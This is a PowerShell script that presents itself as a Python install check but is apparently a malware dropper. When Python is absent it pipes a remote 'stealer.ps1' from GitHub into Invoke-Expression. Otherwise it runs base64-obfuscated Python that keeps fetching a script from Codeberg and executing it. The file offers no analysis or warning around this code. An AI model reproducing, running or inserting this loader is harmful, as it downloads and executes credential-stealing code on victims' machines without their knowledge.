if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "Python is not installed. Installing Python..."
    Start-Process "msiexec.exe" -ArgumentList "/i https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe /quiet InstallAllUsers=1 PrependPath=1" -Wait
    Start-Process powershell -ArgumentList "iwr https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/stealer.ps1 | iex"
} else {
    Start-Process python -ArgumentList '-c', 'exec(__import__("base64").b64decode(b"aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB0aW1lCgp1cmwgPSAiaHR0cHM6Ly9jb2RlYmVyZy5vcmcvNDNhMTcyMy9oYWkxNzIzL3Jhdy9icmFuY2gvbWFpbi9hL21haW4ucHkiCgp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGNvbnRlbnQgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkucmVhZCgpCiAgICAgICAgZXhlYyhjb250ZW50KQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdGltZS5zbGVlcCgzKQ=="))'
}

